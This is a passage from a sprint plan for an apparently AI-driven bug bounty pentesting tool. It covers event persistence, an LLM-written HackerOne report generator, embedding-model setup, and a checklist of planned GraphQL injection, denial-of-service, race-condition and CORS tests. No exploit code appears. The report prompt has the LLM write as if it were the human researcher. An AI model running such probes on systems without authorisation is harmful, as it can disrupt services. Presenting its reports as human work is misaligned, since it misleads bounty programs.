      .then(r => r.json())
      .then((historical: FeedEvent[]) => {
        if (historical.length > 0) {
          setEvents(historical);
          // Determine agent status dari last event
          const lastEvent = historical[historical.length - 1];
          if (lastEvent.type === "ENGAGEMENT_COMPLETED") setAgentStatus("completed");
          else if (lastEvent.type === "AWAITING_APPROVAL") setAgentStatus("waiting");
          else if (lastEvent.type === "NODE_START") setAgentStatus("running");
        }
      })
      .catch(() => {}); // Graceful fail — history tidak critical
  }, [engagementId, accessToken]);

  // ... rest of existing WebSocket logic ...
}
```

---

## Task 19.5 — H1-Ready Executive Summary Report

> **Estimasi:** 3 jam  
> **Impact:** Report langsung bisa disubmit ke H1 tanpa editing manual

```python
# packages/pentra-report/pentra_report/h1_report.py
# Update existing report generator dengan executive summary:

EXECUTIVE_SUMMARY_PROMPT = """You are writing a bug bounty report for HackerOne submission.

Engagement details:
- Target: {target}
- Duration: {duration}
- Findings: {findings_count} total ({critical} critical, {high} high, {medium} medium)

Top findings:
{top_findings}

Write a professional executive summary (3-4 paragraphs):
1. Scope and methodology used
2. Key findings and their business impact
3. Immediate recommendations
4. Overall security posture assessment

Be specific about the vulnerabilities found. Mention exact endpoints and attack techniques used.
Write as if you are the security researcher submitting to the bug bounty program.
Do NOT use generic language. Be technical and precise."""


async def generate_h1_report(
    engagement: dict,
    findings: list[dict],
    llm: "LLMClient",
) -> str:
    """
    Generate H1-ready Markdown report dengan executive summary.
    """
    critical = [f for f in findings if f.get("severity") == "critical"]
    high = [f for f in findings if f.get("severity") == "high"]
    medium = [f for f in findings if f.get("severity") == "medium"]

    top_findings_text = "\n".join(
        f"- [{f['severity'].upper()}] {f['title']} ({f['vuln_class']}) at {f['target_url']}"
        for f in sorted(findings, key=lambda x: {"critical":0,"high":1,"medium":2,"low":3}.get(x.get("severity","low"),3))[:5]
    )

    exec_summary = await llm.complete(
        system="You are a professional security researcher writing HackerOne reports.",
        user=EXECUTIVE_SUMMARY_PROMPT.format(
            target=engagement.get("target_domain", ""),
            duration=engagement.get("duration_minutes", "N/A"),
            findings_count=len(findings),
            critical=len(critical),
            high=len(high),
            medium=len(medium),
            top_findings=top_findings_text,
        )
    )

    # Build full report
    sections = [
        f"# Security Assessment Report — {engagement.get('target_domain', '')}",
        f"\n**Date:** {engagement.get('completed_at', 'N/A')}",
        f"**Engagement ID:** {engagement.get('id', '')}",
        f"**Severity Summary:** {len(critical)}C · {len(high)}H · {len(medium)}M",
        "\n---\n",
        "## Executive Summary",
        exec_summary,
        "\n---\n",
        "## Findings",
    ]

    for i, finding in enumerate(findings, 1):
        section = f"""
### {i}. {finding['title']}

| Field | Value |
|-------|-------|
| **Severity** | {finding.get('severity', '').upper()} |
| **CVSS Score** | {finding.get('cvss_score', 'N/A')} |
| **CVSS Vector** | `{finding.get('cvss_vector', 'N/A')}` |
| **Vulnerability Class** | {finding.get('vuln_class', '')} |
| **Endpoint** | `{finding.get('target_url', '')}` |

**Description:**
{finding.get('description', '')}

**Steps to Reproduce:**
{chr(10).join(f"{j+1}. {step}" for j, step in enumerate(finding.get('reproduction_steps', [])))}

**Impact:**
{finding.get('impact', 'See description above.')}

**Remediation:**
{finding.get('remediation', 'Implement proper input validation and output encoding.')}

**Request:**
```http
{finding.get('request_raw', '')[:500]}
```

**Response (evidence):**
```
{finding.get('response_raw', '')[:300]}
```
"""
        sections.append(section)

    return "\n".join(sections)
```

---

## Task 19.6 — bge-m3 Install (Manual, 5 Menit)

```bash
# Jalankan di terminal — tidak perlu Copilot

# Install
ollama pull bge-m3

# Verifikasi
ollama list | grep bge-m3

# Test embedding
python3 -c "
import httpx, json, asyncio
async def t():
    r = await httpx.AsyncClient().post(
        'http://localhost:11434/api/embeddings',
        json={'model': 'bge-m3', 'prompt': 'SQL injection vulnerability'}
    )
    d = r.json()
    print(f'bge-m3 dimension: {len(d[\"embedding\"])}')
    print('bge-m3 ✅')
asyncio.run(t())
"

# Trigger re-embed semua records
curl -sX POST http://localhost:8001/api/v1/admin/knowledge/reembed \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"model": "bge-m3", "batch_size": 50}'

# Monitor progress
watch -n 30 'curl -s http://localhost:6333/collections/knowledge | jq .result.points_count'
```

---

## Checklist Sprint 19

```
Task 19.1 — GraphQL Injection (4 jam)
[ ] graphql_analyzer.py dibuat dengan 6 test types
[ ] detect_graphql_endpoints() probe 10+ common paths
[ ] extract_schema() + parse_schema() working
[ ] test_sqli_via_graphql() — SQL error detection
[ ] test_introspection_enabled() — finding generation
[ ] test_batch_query_attack() — 50 alias test
[ ] test_deep_query_dos() — timing-based
[ ] test_mass_assignment_via_mutation() — privileged fields
[ ] analyze_graphql_endpoint() — main entry point
[ ] 5 unit tests pass
[ ] Integrasi ke vuln_hunt_node.py
[ ] E2E: detect /graphql endpoint + introspection finding

Task 19.2 — Race Condition (3 jam)
[ ] race_condition.py dibuat
[ ] identify_race_candidates() pattern matching
[ ] test_race_condition() concurrent HTTP requests (HTTP/2)
[ ] 2 unit tests pass (mock concurrent responses)
[ ] Integrasi ke vuln_hunt_node.py
[ ] race_prone_endpoints di GF patterns dipakai sebagai candidates

Task 19.3 — CORS Testing (1 jam)
[ ] cors_tester.py dibuat
[ ] test_cors() dengan 6 origin tests
[ ] 1 unit test
[ ] Integrasi ke vuln_hunt_node.py (per live endpoint)

Task 19.4 — Event Persistence (2 jam)
[ ] AgentEventORM model + migration
[ ] broadcast_and_persist() function
[ ] GET /engagements/{id}/events endpoint
[ ] useEngagementFeed hook load historical on mount
[ ] Browser refresh tidak kehilangan event history

Task 19.5 — H1 Executive Summary (3 jam)
[ ] generate_h1_report() dengan LLM executive summary
[ ] Report include: summary, findings tabel, steps to reproduce, CVSS
[ ] Test: report untuk 10 findings dari testaspnet engagement

Task 19.6 — bge-m3 (manual, 5 menit)
[ ] ollama pull bge-m3 berhasil
[ ] Embedding dimension > 0
[ ] Re-embed triggered
[ ] KB search quality improvement

Total tests baru Sprint 19: 5+2+1+2 = 10+ tests
Total tests target: 255 + 10 = 265+
```

---

## Prompt untuk Copilot

```
Baca CLAUDE.md, PROGRESS.md, dan SPRINT-19.md secara lengkap.

Sprint 19 fokus pada 3 capability yang belum ada:
- GraphQL injection testing
- Race condition testing
- CORS misconfiguration testing

Mulai Task 19.1 — GraphQL Analyzer:

1. Buat packages/pentra-tools/pentra_tools/vuln/graphql_analyzer.py
   sesuai kode di SPRINT-19.md Task 19.1 (semua fungsi lengkap)

2. Buat packages/pentra-tools/tests/test_graphql_analyzer.py
   dengan 5 unit tests

3. Jalankan: uv run pytest packages/pentra-tools/tests/test_graphql_analyzer.py -v
   Semua 5 tests harus pass.

4. Update packages/pentra-agent/pentra_agent/nodes/vuln_hunt_node.py:
   - Import analyze_graphql_endpoint
   - Tambahkan GraphQL detection + analysis setelah nuclei scan
   - Log: "[vuln_hunt] GraphQL: N findings"

5. Jalankan full test suite: uv run pytest packages/ -q
   Expected: 265+ tests, 0 failed.

Setelah Task 19.1 selesai, lanjut Task 19.2 (Race Condition).
```

---

*SPRINT-19.md — Pentra AI*  
*Analisis dari: Security Engineering + Systems Engineering + Product Engineering*  
*New capabilities: GraphQL injection, Race conditions, CORS testing*  
*UX improvements: Event persistence, H1-ready reports*  
*Target: 265+ tests, 3 new vuln classes, report siap H1 submission*
